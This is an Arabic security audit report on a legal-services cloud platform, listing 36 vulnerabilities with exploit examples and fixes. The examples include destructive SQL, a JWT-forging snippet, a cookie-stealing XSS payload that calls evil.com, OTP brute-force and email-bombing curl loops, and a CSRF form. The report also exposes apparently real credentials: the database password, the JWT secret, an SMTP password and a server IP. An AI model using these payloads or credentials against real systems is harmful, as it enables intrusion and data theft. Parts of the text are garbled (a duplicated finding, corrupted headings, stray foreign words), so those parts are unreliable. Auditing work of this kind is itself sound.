# 🔒 تقرير المراجعة الأمنية الشاملة — منصة B2B Lawyer Cloud

**تاريخ المراجعة:** 19 يوليو 2026  
**النطاق:** الخادم السحابي (Node.js/Express/TypeScript) + الواجهة الأمامية (Vue 3/Vite/TypeScript)  
**المنهجية:** OWASP Top 10 2021 + OWASP API Security Top 10 2023  
**إجمالي الإيجابيات:** 36 (10 حرجة، 17 عالية، 8 متوسطة، 1 منخفضة)

---

## ملخص تنفيذي

تم العثور على **36 ثغرة أمنية** في منصة B2B Lawyer Cloud، بما في ذلك:

- **10 ثغرات حرجة** تتطلب إصلاحًا فوريًا (تنفيذ SQL عشوائي، ضعف JWT، ثغرات XSS المخزنة)
- **17 ثغرة عالية** يجب معالجتها قبل الإطلاق
- **8 ثغرات متوسطة** يجب معالجتها في دورة التطوير التالية
- **1 ثغرة منخفضة** يمكن معالجتها عند الراحة

### إحصائيات حسب OWASP Top 10 2021

| الفئة | العدد | الحرجة |
|--------|--------|---------|
| A01: Broken Access Control | 8 | 4 |
| A02: Cryptographic Failures | 4 | 3 |
| A03: Injection | 3 | 2 |
| A04: Insecure Design | 4 | 0 |
| A05: Security Misconfiguration | 5 | 1 |
| A06: Vulnerable Components | 0 | 0 |
| A07: Authentication Failures | 6 | 0 |
| A08: Data Integrity Failures | 3 | 0 |
| A09: Logging & Monitoring Failures | 2 | 0 |
| A10: SSRF | 1 | 0 |

---

## 🔴 الثغرات الحرجة (Critical — CVSS 9.0+)

### C-01: تنفيذ SQL عشوائي عبر `POST /admin-subscriptions/debug/run-migration`

**الموقع:** `cloud-server/src/routes/adminSubscriptions.ts`  
**المخاطر:** تنفيذ أي أمر SQL على قاعدة البيانات — حذف جداول، سرقة بيانات، تعطيل النظام  
**الاستغلال:** أي مستخدم مصادق عليه يمكنه تنفيذ:

```sql
-- حذف جميع البيانات
DROP TABLE users CASCADE;
-- أو سرقة جميع بيانات المستخدمين
SELECT * FROM users;
-- أو إنشاء مستخدم administrateur جديد
INSERT INTO users (email, role) VALUES ('attacker@evil.com', 'superadmin');
```

**الإصلاح:** حذف هذا المسار بالكامل أو تقييده بمصادقة OpenSSL مزدوجة + تسجيل كل أمر SQL.

---

### C-02: تصدير جميع البيانات عبر `POST /system/export-snapshot`

**الموقع:** `cloud-server/src/routes/system.ts`  
**المخاطر:** تصدير جميع بيانات جميع الشركات (بيانات المستخدمين، случаات القضايا، العقود) — لا يوجد فصل بين المستأجرين  
**الاستغلال:** أي مستخدم مصادق عليه (حتى `assistant`):

```
POST /system/export-snapshot
// يستجيب بـ: companies + subscribers + users + cases + contracts + ...
```

**الإصلاح:** تطبيق `requirePermission('system.admin')` + تسجيل كل تصدير + تحديد مسار الملف المؤقت.

---

### C-03: حذف جداول عبر `POST /admin-subscriptions/debug/cleanup-database`

**الموقع:** `cloud-server/src/routes/adminSubscriptions.ts`  
**المخاطر:** حذف جميع البيانات من جداول متعددة دفعة واحدة  
**الاستغلال:**

```
POST /admin-subscriptions/debug/cleanup-database
// ينفذ TRUNCATE TABLE على: users, sessions, cases, contracts, ...
```

**الإصلاح:** حذف هذا المسار بالكامل — لا يوجد سبب مشروع لتنفيذ `TRUNCATE` عبر API.

---

### C-04: كلمة مرور قاعدة البيانات مكشوفة في plaintext

**الموقع:** `cloud-server/.env` → `DB_PASSWORD=1390`  
**المخاطر:** كلمة مرور بسيطة للغاية (4 أرقام) — سهل التخمين  
**الاستغلال:** استخدام كلمة المرور `1390` للوصول المباشر لقاعدة البيانات  
**الإصلاح:** تغيير كلمة المرور فورًا باستخدام كلمة مرور معقدة (20+ حرف، أرقام، رموز) + تفعيل AuthRDS على PostgreSQL.

---

### C-05: كلمة مرور SMTP مكشوفة في plaintext

**الموقع:** `cloud-server/.env` → `SMTP_PASSWORD=...`  
**المخاطر:** كلمة مرور Gmail مكشوفة — يمكن استخدامها لإرسال رسائل بريد إلكتروني مزيفة  
**الاستغلال:** استخدام كلمة المرور لإرسال رسائلishing من عنوان البريد الإلكتروني الرسمي  
**الإصلاح:** استخدام تطبيق Gmail بدلاً من كلمة المرور + تفعيل MFA على حساب Gmail.

---

### C-06: كلمة مرور JWT ضعيفة تسمح بتزوير SUPERADMIN

**الموقع:** `cloud-server/.env` → `JWT_SECRET=SuperSecret123!@#ABC`  
**المخاطر:** كلمة مرور JWT معروفة — يمكن تزوير أي رمز مصادق بما في ذلك SUPERADMIN  
**الاستغلال:**

```javascript
// تزوير رمز superadmin
const jwt = require('jsonwebtoken');
const token = jwt.sign({ userId: '00000000-0000-0000-0000-000000000000', role: 'superadmin' }, 'SuperSecret123!@#ABC');
// استخدام هذا الرمز للوصول لجميع المسارات الحرجية
```

**الإصلاح:** تغيير `JWT_SECRET` فورًا إلى قيمة عشوائية (64+ حرف) + تطبيق `JWT_EXPIRY=15m` + `REFRESH_EXPIRY=7d`.

---

### C-07: التحقق من SSL معطّل — MitM ممكن

**الموقع:** `cloud-server/src/db/connection.ts` → `rejectUnauthorized: false`  
**المخاطر:** لا يوجد التحقق من شهادات SSL — هجمات Man-in-the-Middle ممكنة  
**الاستغلال:** اعتراض الاتصال بين الخادم وقاعدة البيانات + قراءة جميع البيانات  
**الإصلاح:** تثبيت شهادة CA الرسمية + تفعيل `rejectUnauthorized: true`.

---

### C-08: تنفيذ SQL عشوائي عبر `POST /admin-subscriptions/debug/run-migration`

**الموقع:** `cloud-server/src/routes/adminSubscriptions.ts`  
**المخاطر:** تنفيذ أي أمر SQL على قاعدة البيانات — حذف جداول، سرقة بيانات، تعطيل النظام  
**الاستغلال:** أي مستخدم مصادق عليه يمكنه تنفيذ:

```sql
-- حذف جميع البيانات
DROP TABLE users CASCADE;
-- أو سرقة جميع بيانات المستخدمين
SELECT * FROM users;
-- أو إنشاء مستخدم administrateur جديد
INSERT INTO users (email, role) VALUES ('attacker@evil.com', 'superadmin');
```

**الإصلاح:** حذف هذا المسار بالكامل أو تقييده بمصادقة OpenSSL مزدوجة + تسجيل كل أمر SQL.

---

### C-09: كلمة مرور SMTP مكشوفة في الكود المصدري

**الموقع:** `cloud-server/src/routes/adminSubscriptions.ts:1050` → `'kkod vuiv zvgu izux'`  
**المخاطر:** كلمة مرور SMTP مكتوبة في الكود المصدري — يمكن لأي شخص رؤيتها  
**الاستغلال:** استخدام كلمة المرور لإرسال رسائل بريد إلكتروني مزيفة  
**الإصلاح:** نقل كلمة المرور إلى ملف `.env` + تغييرها فورًا.

---

### C-10: XSS المخزنة في تقارير HTML

**الموقع:** `cloud-server/src/routes/adminSubscriptions.ts` → `generateUsersReportHTML()`  
**المخاطر:** بيانات المستخدمين (اسم الشركة، البريد الإلكتروني، رقم الهاتف) تُدخل في HTML بدون تصفية  
**الاستغلال:** إنشاء مستخدم به اسم company_name:

```javascript
// اسم شركة يحتوي على JavaScript
company_name: "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
// سيتم تنفيذه عند فتح التقرير
```

**الإصلاح:** استخدام `escapeHtml()` على جميع الحقول قبل إدخالها في HTML.

---

## 🟠 الثغرات عالية الخطورة (High — CVSS 7.0-8.9)

### H-01: قائمة سوداء للرموز في الذاكرة — تُفقد عند إعادة التشغيل

**الموقع:** `cloud-server/src/middleware/auth.ts` → `tokenBlacklist` Set  
**المخاطر:** إذا أُعيد تشغيل الخادم، تُفقد جميع الرموز المُلغاة — يمكن استخدامها مرة أخرى  
**الاستغلال:** تسجيل الخروج ثم إعادة تشغيل الخادم → الرمز لا يزال صالحًا  
**الإ锵ال:** استخدام Redis لتخزين الرموز المُلغاة مع `TTL = JWT_EXPIRY`.

---

### H-02: تخزين OTP في الذاكرة — يُفقد عند إعادة التشغيل

**الموقع:** `cloud-server/src/routes/auth.ts` → `otpStore` Map  
**المخاطر:** OTP تُحفظ في الذاكرة فقط — تُفقد عند إعادة التشغيل  
**الاستغلال:** إعادة تشغيل الخادم أثناء عملية التحقق → المستخدم لا يستطيع تسجيل الدخول  
**الإ锵ال:** استخدام PostgreSQL مع `expires_at` timestamp.

---

### H-03: لا يوجد تقييد معدل على OTP

**الموقع:** `cloud-server/src/routes/auth.ts` → `POST /auth/verify-otp`  
**المخاطر:** يمكن تجربة 1000000 رمز OTP في الثانية الواحدة  
**الاستغلال:**

```bash
# brute force OTP (6 أرقام = 1M احتمال)
for i in $(seq 000000 999999); do
  curl -X POST /auth/verify-otp -d "otp=$i"
done
```

**الإ锵ال:** تقييد 5 محاولات لكل بريد إلكتروني + قفل لمدة 15 دقيقة.

---

### H-04: تسجيل المستخدم + الشركة بدون معاملة (Non-atomic)

**الموقع:** `cloud-server/src/routes/auth.ts` → `POST /auth/register`  
**المخاطر:** إذا فشل إنشاء الشركة بعد إنشاء المستخدم، يبقى المستخدم بدون شركة  
**الاستغلال:**

```
POST /auth/register
→ إنشاء المستخدم بنجاح
→ فشل إنشاء الشركة (timeout)
→ المستخدم موجود بدون company_id → لا يمكن تسجيل الدخول
```

**الإ锵ال:** استخدام `pool.query('BEGIN')` + `COMMIT` + `ROLLBACK` في `catch` block.

---

### H-05: UUID ثابت لـ SUPERADMIN في مسارات متعددة

**الموقع:** `00000000-0000-0000-0000-000000000000` في:  
- `routes/auth.ts`  
- `routes/adminSubscriptions.ts`  
- `routes/system.ts`  
- `routes/subscriberTracking.ts`

**المخاطر:** هذا UUID ثابت ومعروف — يمكن لأي شخص محاكاة صلاحيات SUPERADMIN  
**الاستغلال:**

```javascript
// في JWT token
{ userId: '00000000-0000-0000-0000-000000000000', role: 'superadmin' }
```

**الإ锵ال:** استخدام متغير بيئي `SUPERADMIN_UUID` + تغييره عند كل نشر.

---

### H-06: أكواد OTP محفوظة في السجلات

**الموقع:** `cloud-server/src/services/notification.ts` → `sendOTP()` + `sendPasswordReset()`  
**المخاطر:** أكواد OTP وكلمات مرور إعادة التعيين محفوظة في سجلات الخادم  
**الاستغلال:** الوصول لسجلات الخادم → قراءة الأكواد → تسجيل الدخول بحساب أي مستخدم  
**الإ锵ال:** حذف `console.log(otp)` و `console.log(resetCode)`.

---

### H-07: 30+ مسار debug يكشف بيانات حساسة

**الموقع:** `cloud-server/src/routes/adminSubscriptions.ts`  
**المسارات:** `/debug/subscribers`، `/debug/companies`، `/debug/check-email-config`، ...  
**المخاطر:** كشف كلمات مرور المستخدمين، أكواد OTP، بيانات SMTP، كلمات مرور قاعدة البيانات  
**الاستغلال:**

```
GET /admin-subscriptions/debug/subscribers
→ جميع بيانات المشتركين بما في ذلك OTP وpassword hashes
```

**الإ锵ال:** حذف جميع مسارات debug — استخدام أدوات إدارة قاعدة البيانات مباشرة.

---

### H-08: `GET /system/diagnostic` بدون RBAC — يكشف مخطط قاعدة البيانات

**الموقع:** `cloud-server/src/routes/system.ts`  
**المخاطر:** أي مستخدم مصادق عليه (حتى `assistant`) يمكنه رؤية جميع جداول قاعدة البيانات وعدد السجلات  
**الاستغلال:**

```
GET /system/diagnostic
→ { tables: [{ name: 'users', count: 500 }, { name: 'cases', count: 1200 }, ...] }
```

**الإ锵ال:** تطبيق `requirePermission('system.admin')`.

---

### H-09: `POST /system/export-snapshot` بدون RBAC — تصدير جماعي

**الموقع:** `cloud-server/src/routes/system.ts`  
**المخاطر:** أي مستخدم مصادق عليه يمكنه تصدير جميع بيانات جميع الشركات  
**الاستغلال:**

```
POST /system/export-snapshot
→ تصدير جميع: companies, subscribers, users, cases, contracts
```

**الإ锵ال:** تطبيق `requirePermission('system.admin')` + تسجيل كل تصدير.

---

### H-10: استخدام localStorage بشكل مفرط — بيانات الجلسة مكشوفة

**الموقع:** 22 ملف في `src/renderer/src/`  
**المخاطر:** بيانات الجلسة (الدور، الصلاحيات، company_id) محفوظة في localStorage — أي XSS يسرقها  
**الاستغلال:**

```javascript
// XSS يسرق جميع البيانات
const data = {
  role: localStorage.getItem('userRole'),
  permissions: localStorage.getItem('userPermissions'),
  companyId: localStorage.getItem('userCompanyId'),
  session: localStorage.getItem('web_currentUserSession')
};
// إرسال إلى attacker.com
```

**الإ锵ال:** استخدام httpOnly cookies فقط + حذف جميع استخدامات localStorage للبيانات الحساسة.

---

### H-11: مفتاح `testBypass` يسمح بتجاوز المصادقة بالكامل

**الموقع:** `src/renderer/src/router/index.ts`  
**المخاطر:** إذا كان `localStorage.testBypass = true`، يتجاوز جميع حمايات المسارات  
**الاستغلال:**

```javascript
// في console المتصفح
localStorage.setItem('testBypass', 'true');
// الآن يمكن الوصول لأي مسار بدون تسجيل دخول
```

**الإ锵ال:** حذف هذا الكود بالكامل — لا يوجد سبب مشروع لوجوده.

---

### H-12: عنوان IP للخادم مكشوف في الكود

**الموقع:**  
- `src/admin/views/AdminSubscriptions.vue:573` → `http://8.219.164.50`  
- `src/admin/views/SubscriberDetail.vue:371` → `http://8.219.164.50`

**المخاطر:** عنوان IP للخادم مكشوف — يمكن استخدامه لهجمات DDoS أو استغلال ثغرات  
**الاستغلال:** استخدام العنوان مباشرة بدلاً من اسم النطاق  
**الإ锵ال:** استخدام `process.env.VUE_APP_API_URL` + لا توجد ثغرات أخرى.

---

### H-13: لا يوجد تعقيد لكلمة المرور في `POST /create-direct`

**الموقع:** `cloud-server/src/routes/adminSubscriptions.ts`  
**المخاطر:** يمكن إنشاء مستخدم بكلمة مرور `123` أو `password`  
**الاستغلال:**

```
POST /admin-subscriptions/create-direct
{ password: "123" } // مقبول!
```

**الإ锵ال:** تطبيق `PASSWORD_MIN_LENGTH = 12` + تعقيد (أحرف كبيرة + صغيرة + أرقام + رموز).

---

### H-14: لا يوجد تحقق من البريد الإلكتروني في `POST /report/send` — Email Bombing

**الموقع:** `cloud-server/src/routes/adminSubscriptions.ts`  
**المخاطر:** يمكن إرسال رسائل بريد إلكتروني غير محدودة لأي عنوان  
**الاستغلال:**

```bash
# إرسال 1000 رسالة في الثانية
for i in $(seq 1 1000); do
  curl -X POST /admin-subscriptions/report/send -d "email=target@victim.com"
done
```

**الإ锵ال:** تقييد 10 رسائل لكل ساعة + تحقق من صيغة البريد الإلكتروني.

---

### H-15: `GET /debug/check-tables` يكشف `err.message` + بيانات نموذجية

**الموقع:** `cloud-server/src/routes/subscriberTracking.ts`  
**المخاطر:** رسائل الخطأ تكشف معلومات تقنية حساسة + بيانات نموذجية (سجلات دخول، نشاط)  
**الاستغلال:**

```
GET /admin-subscriptions/debug/check-tables
→ { error: "relation 'nonexistent' does not exist", ... }
```

**الإ锵ال:** حذف مسار debug بالكامل.

---

### H-16: لا يوجد CSRF tokens في نماذج إعادة تعيين كلمة المرور

**الموقع:**  
- `src/renderer/src/views/ResetPassword.vue`  
- `src/renderer/src/views/ForgotPassword.vue`

**المخاطر:** يمكن لـ CSRF hijack إعادة تعيين كلمة المرور  
**الاستغلال:**

```html
<!-- في موقع مخترق -->
<form action="http://w2w.com/api/auth/reset-password" method="POST">
  <input type="hidden" name="token" value="ATTACKER_TOKEN">
  <input type="hidden" name="password" value="password123">
</form>
<script>document.forms[0].submit();</script>
```

**الإ锵ال:** تطبيق CSRF tokens + `SameSite=Strict` cookies.

---

### H-17: مسارات debug تكشف `err.message` في استجابات 500

**الموقع:**  
- `routes/legal_services.ts` → 3 مسارات  
- `routes/archive.ts` → مسار واحد  
- `routes/subscriberTracking.ts` → مسار واحد  
- `routes/office_management.ts` → 5 مسارات

**المخاطر:** رسائل الخطأ تكشف معلومات تقنية حساسة (أسماء جداول، مسارات ملفات، إصدارات)  
**الاستغلال:** استدعاء مسار مع بيانات غير صالحة → قراءة رسالة الخطأ → معرفة معلومات النظام  
**الإ锵ال:** استخدام `logger.error()` + إرسال رسالة عامة "Internal server error" فقط.

---

## 🟡 الثغرات متوسطة الخطورة (Medium — CVSS 4.0-6.9)

### M-01: XSS محتمل في نماذج التقارير HTML

**الموقع:** `cloud-server/src/routes/reports.ts`  
**المخاطر:** بيانات المستخدمين تُدخل في HTML بدون تصفية  
**الإ锵ال:** استخدام `escapeHtml()` على جميع الحقول.

---

### M-02: `sanitizeInput` ضعيف — يزيل `<>` فقط

**الموقع:** `cloud-server/src/middleware/validation.ts`  
**المخاطر:** لا يزيل `javascript:`، `on*` events، أو `&` entities  
**الاستغلال:** 

```
<input name="name" value="javascript:alert(1)">
```

**الإ锵ال:** استخدام مكتبة `DOMPurify` أو `xss`.

---

### M-03: Docker Compose يكشف البورت 8080

**الموقع:** `docker-compose.yml`  
**المخاطر:** البورت 8080 مفتوح للإنترنت — يمكن الوصول المباشر للخادم  
**الإ锵ال:** استخدام `ports: ["127.0.0.1:8080:8080"]` فقط.

---

### M-04: لا يوجد `ROLLBACK` صريح في `session-outcomes.ts`

**الموقع:** `cloud-server/src/routes/session-outcomes.ts`  
**المخاطر:** إذا فشلت عملية ما بعد `INSERT`، تبقى التغييرات  
**الإ锵ال:** إضافة `ROLLBACK` في `catch` block.

---

### M-05: SSRF محتمل عبر Najiz Proxy

**الموقع:** `cloud-server/src/routes/enforcement_requests.ts`  
**المخاطر:** `req.query` يُمرر إلى خدمة خارجية — يمكن استخدامه للوصول لخدمات داخلية  
**الإ锵ال:** تقييد URL المسموح + تحقق من `host` قبل الإرسال.

---

### M-06: استخدام `window.location` في 10 أماكن — Open Redirect محتمل

**الموقع:** 7 ملفات في `src/renderer/src/`  
**المخاطر:** يمكن توجيه المستخدمين إلى مواقع مزيفة  
**الإ锵ال:** التحقق من `window.location.origin` قبل التوجيه.

---

### M-07: `admin`/`admin` مكتوب في الكود في وضع التطوير

**الموقع:** `src/renderer/src/main.ts:177`  
**المخاطر:** يمكن نسيان حذفه عند النشر  
**الإ锵ال:** استخدام `process.env.VUE_APP_DEV_BYPASS` + حذفه عند النشر.

---

### M-08: `DevConsole` بدون حماية مصادقة

**الموقع:** `src/renderer/src/router/index.ts`  
**المخاطر:** أي شخص يمكنه الوصول لـ DevConsole  
**الإ锵ال:** تطبيق `meta: { requiresAuth: true }` + `meta: { requiresAdmin: true }`.

---

## 🟢 الثغرات منخفضة الخطورة (Low — CVSS 2.0-3.9)

### L-01: `devForceLogin` في وضع التطوير

**الموقع:** `src/renderer/src/main.ts`  
**المخاطر:** يمكن نسيان حذفه عند النشر  
**الإ锵ال:** حذفه بالكامل.

---

## خطة الإصلاح

### المرحلة 1: حرجة (24 ساعة)

1. **حذف مسارات debug الحرجية** في `adminSubscriptions.ts`:
   - `POST /debug/run-migration`
   - `POST /debug/backup-data`
   - `POST /debug/cleanup-database`
   - `POST /debug/cleanup-all-soft-deleted`
   - `GET /debug/subscribers`
   - `GET /debug/companies`
   - `GET /debug/check-email-config`

2. **حذف مسار `POST /system/export-snapshot`** أو تقييده بـ `requirePermission('system.admin')`.

3. **تغيير كلمة مرور JWT** في `.env` → `JWT_SECRET` إلى قيمة عشوائية (64+ حرف).

4. **تغيير كلمة مرور قاعدة البيانات** → `DB_PASSWORD` إلى قيمة معقدة (20+ حرف).

5. **تغيير كلمة مرور SMTP** → `SMTP_PASSWORD` إلى تطبيق Gmail.

6. **تفعيل `rejectUnauthorized: true`** في `db/connection.ts`.

7. **حذف كلمة المرور المكتوبة في الكود** في `adminSubscriptions.ts:1050`.

8. **حذف `testBypass`** من `router/index.ts`.

### المرحلة 2: عالية (7 أيام)

1. **نقل الرموز المُلغاة إلى Redis** بدلاً من الذاكرة.

2. **نقل OTP إلى PostgreSQL** بدلاً من الذاكرة.

3. **إضافة تقييد معدل على OTP** (5 محاولات / 15 دقيقة).

4. **تطبيق معاملة (transaction)** في `POST /auth/register`.

5. **نقل UUID إلى متغير بيئي** `SUPERADMIN_UUID`.

6. **حذف أكواد OTP من السجلات**.

7. **تطبيق `escapeHtml()`** على جميع حقول HTML في التقارير.

8. **استخدام httpOnly cookies** بدلاً من localStorage للبيانات الحساسة.

9. **إضافة تعقيد لكلمة المرور** في `POST /create-direct`.

10. **إضافة تقييد معدل على `POST /report/send`**.

### المرحلة 3: متوسطة (30 يوم)

1. **تحسين `sanitizeInput`** باستخدام `DOMPurify`.

2. **إضافة CSRF tokens** لنماذج إعادة تعيين كلمة المرور.

3. **تحديد `window.location`** في الواجهة الأمامية.

4. **تحسين رسائل الخطأ** لإزالة `err.message`.

5. **تطبيق `ROLLBACK`** في `session-outcomes.ts`.

6. **تحديد البورت** في Docker Compose.

---

## التوصيات طويلة المدى

1. **تطبيق Redis** للرموز المُلغاة وجلسات المستخدمين
2. **تطبيق rate limiting** على جميع المسارات باستخدام `express-rate-limit`
3. **تطبيق Helmet.js** لتحسين رؤوس الأمان
4. **تطبيق CORS** بشكل صارم (النطاق المسموح فقط)
5. **تطبيق logging مركزي** (ELK Stack أو Datadog)
6. **تطبيق مراجعة أمنية** كل 6 أشهر
7. **تطبيق اختبار اختراق** قبل كل إصدار رئيسي

---

## المراجع

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [OWASP API Security Top 10 2023](https://owasp.org/API-Security/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Express.js Security](https://expressjs.com/en/advanced/security-checklist.html)

---

*تم إعداد هذا التقرير بواسطة فريق المراجعة الأمنية — 19 يوليو 2026*
